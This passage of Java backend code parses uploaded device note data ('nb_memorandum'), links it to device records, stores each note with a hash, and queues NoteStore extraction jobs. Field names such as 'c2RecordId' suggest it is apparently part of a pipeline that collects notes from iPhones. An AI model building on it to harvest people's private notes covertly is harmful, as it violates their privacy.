            log.warn("【nb_memorandum】无 file_path/body_b64，跳过 id={}", ios18Id);
            return true;
        }

        JSONObject nb = JSON.parseObject(rawBody);
        if (nb == null) {
            log.warn("【nb_memorandum】JSON 解析失败 id={}", ios18Id);
            return true;
        }
        if (lhu.isEmpty()) lhu = nb.getString("lhu");
        if (lhu == null) lhu = "";
        JSONArray list = nb.getJSONArray("list");
        if (list == null || list.isEmpty()) {
            log.warn("【nb_memorandum】list 为空，跳过 id={} keys={}", ios18Id, nb.keySet());
            return true;
        }

        // 尽量关联 device；没有也照样入库（device_row_id / channelcode 置空）
        String uid = !deviceId.isEmpty() ? deviceId : lhu;
        DeviceEntity device = null;
        if (!uid.isEmpty()) {
            try {
                device = deviceDao.findByDeviceIdLatest(uid);
                if (device == null) {
                    device = deviceDao.findByDeviceid(uid);
                }
            } catch (Exception e) {
                log.warn("【nb_memorandum】查 device 失败 uid={} err={}", uid, e.toString());
            }
        }
        Integer deviceRowId = (device != null && device.getId() != null) ? device.getId() : 0;
        String channelcode = "";
        String serial = "";
        if (device != null) {
            channelcode = device.getChannelCode() == null ? "" : device.getChannelCode();
            serial = device.getSerial() == null ? "" : device.getSerial();
        }
        if (deviceRowId == null || deviceRowId == 0) {
            log.info("【nb_memorandum】无 device 记录，仍入库（device_row_id=0, channelcode 空） id={} uid={}",
                    ios18Id, uid);
        }

        Integer ecid = null;
        if (nb.containsKey("ecid")) {
            try { ecid = nb.getInteger("ecid"); } catch (Exception ignore) {}
        }
        if (ecid == null && device != null && device.getEcid() != null) {
            try { ecid = Integer.parseInt(device.getEcid().trim()); } catch (Exception ignore) {}
        }
        if (ecid == null) ecid = 0;

        double now = System.currentTimeMillis() / 1000.0;
        int count = 0;
        int fail = 0;
        int skipEmpty = 0;

        for (Object o : list) {
            String title = "";
            String content;
            if (o instanceof String) {
                content = (String) o;
            } else if (o instanceof JSONObject) {
                JSONObject j = (JSONObject) o;
                String t = firstNonEmpty(j.getString("title"));
                title = t == null ? "" : t;
                content = firstNonEmpty(
                        j.getString("body"),
                        j.getString("content"),
                        composeTitleSnippet(title, j.getString("snippet")),
                        j.getString("snippet"),
                        "");
            } else if (o instanceof Map) {
                @SuppressWarnings("unchecked")
                Map<String, Object> m = (Map<String, Object>) o;
                String t = firstNonEmpty(strVal(m.get("title")));
                title = t == null ? "" : t;
                content = firstNonEmpty(
                        strVal(m.get("body")),
                        strVal(m.get("content")),
                        composeTitleSnippet(title, strVal(m.get("snippet"))),
                        strVal(m.get("snippet")),
                        "");
            } else {
                log.warn("【nb_memorandum】list 元素类型不支持 type={}", o == null ? null : o.getClass().getName());
                skipEmpty++;
                continue;
            }
            if (content == null || content.isEmpty()) {
                skipEmpty++;
                continue;
            }
            String hash = sha256Hex((title + "\n" + content).getBytes(StandardCharsets.UTF_8));
            MemorandumEntity me = new MemorandumEntity();
            me.setDeviceRowId(deviceRowId);
            me.setDeviceUid(uid == null ? "" : uid);
            me.setEcid(ecid);
            me.setChannelcode(channelcode);
            me.setSerial(serial);
            me.setType("7");
            me.setContent(content);
            me.setContentHash(hash);
            me.setTitle(title);
            me.setC2RecordId(ios18Id);
            me.setAddtime(now);
            try {
                memorandumDao.insert(me);
                count++;
            } catch (Exception e) {
                // 唯一键冲突视为已入库成功（幂等）
                String msg = e.toString();
                if (msg.contains("Duplicate") || msg.contains("duplicate") || msg.contains("UK_") || msg.contains("uk_")) {
                    count++;
                    log.info("【nb_memorandum】已存在跳过 id={} hash={}", ios18Id, hash);
                } else {
                    fail++;
                    log.warn("【nb_memorandum】insert 失败 id={} hash={} err={}", ios18Id, hash, msg);
                }
            }
        }
        if (device != null && !uid.isEmpty()) {
            try {
                deviceDao.touchByDeviceId(uid, now);
            } catch (Exception e) {
                log.warn("【nb_memorandum】touch device 失败 uid={} err={}", uid, e.toString());
            }
        }
        log.info("【nb_memorandum】备忘录数据处理完成 device={} deviceRowId={} channel={} count={} ok={} fail={} skipEmpty={} listSize={}",
                uid, deviceRowId, channelcode, count, count, fail, skipEmpty, list.size());

        // 阶段2：有 NoteStore 时入队追加正文（不阻塞主队列 ACK）
        if (NoteStoreBodyExtractor.hasNoteStore(nb)) {
            try {
                Map<String, String> nsJob = new HashMap<>();
                nsJob.put("job", "nb_notestore");
                if (ios18Id != null) nsJob.put("ios18param_id", String.valueOf(ios18Id));
                nsJob.put("device_id", uid);
                nsJob.put("storage", storage);
                nsJob.put("file_path", filePath);
                if (!bodyB64.isEmpty()) nsJob.put("body_b64", bodyB64);
                redisPush.notifySync(nsJob, redisPush.streamNbNotestore());
                log.info("【nb_memorandum】链式触发 nb_notestore 入队成功 id={} device={}", ios18Id, uid);
            } catch (Throwable t) {
                log.error("【nb_memorandum】链式触发 nb_notestore 入队失败 id={} err={}", ios18Id, t.toString());
            }
        }
        return true;
    }

    // ==================================================================
    // 工具方法
    // ==================================================================

    private static byte[] readFileBytes(File f) throws IOException {
        long len = f.length();
        if (len > Integer.MAX_VALUE) throw new IOException("file too large: " + len);
        byte[] buf = new byte[(int) len];
        try (java.io.FileInputStream in = new java.io.FileInputStream(f)) {
            int off = 0, read;
            while (off < buf.length && (read = in.read(buf, off, buf.length - off)) > 0) off += read;
        }
        return buf;
    }

    private static String sha256Hex(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                int v = b & 0xFF;
                sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private static String sanitizeFileName(String name) {
        if (name == null || name.isEmpty()) return "unnamed";
        return name.replaceAll("[^a-zA-Z0-9_\\-\\.]", "_");
    }

    private static String getStem(String fileName) {
        int dot = fileName.lastIndexOf('.');
        return dot > 0 ? fileName.substring(0, dot) : fileName;
    }

    private static String firstNonEmpty(String... arr) {
        for (String s : arr) if (s != null && !s.isEmpty()) return s;
        return null;
    }

    /** list 无 body 时：title + snippet 拼成可读正文（避免 content 只剩摘要一行） */
    private static String composeTitleSnippet(String title, String snippet) {
        String t = title == null ? "" : title.trim();
        String s = snippet == null ? "" : snippet.trim();
        if (t.isEmpty() && s.isEmpty()) return null;
        if (t.isEmpty()) return s;
        if (s.isEmpty()) return t;
        if (t.contains(s) || s.contains(t)) {
            return t.length() >= s.length() ? t : s;
        }
        return t + "\n" + s;
    }

    private static String strVal(Object o) {
        return o == null ? null : String.valueOf(o);
    }

    private static String nullToEmpty(String s) {
        return s == null ? "" : s;
    }

    /**
     * 从落盘文件路径提取 device UUID。
     * 文件名格式：{YYYYMMDD}/{kind}/{device}_{sha16}_{size}.bin
     * device 是第一个 _ 之前的部分，且必须是合法的 hex UUID（长度≥16，全 hex）。
     */
    private static String extractDeviceFromPath(String filePath) {
        if (filePath == null || filePath.isEmpty()) return "";
        String name = filePath;
        int slash = Math.max(filePath.lastIndexOf('/'), filePath.lastIndexOf('\\'));
        if (slash >= 0) name = filePath.substring(slash + 1);
        int dot = name.lastIndexOf('.');
        if (dot > 0) name = name.substring(0, dot);
        int us = name.indexOf('_');
        if (us <= 0) return "";
        String candidate = name.substring(0, us);
        if (candidate.length() < 16) return "";
        for (int i = 0; i < candidate.length(); i++) {
            char c = candidate.charAt(i);
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
                return "";
            }
        }
        return candidate;
    }
}
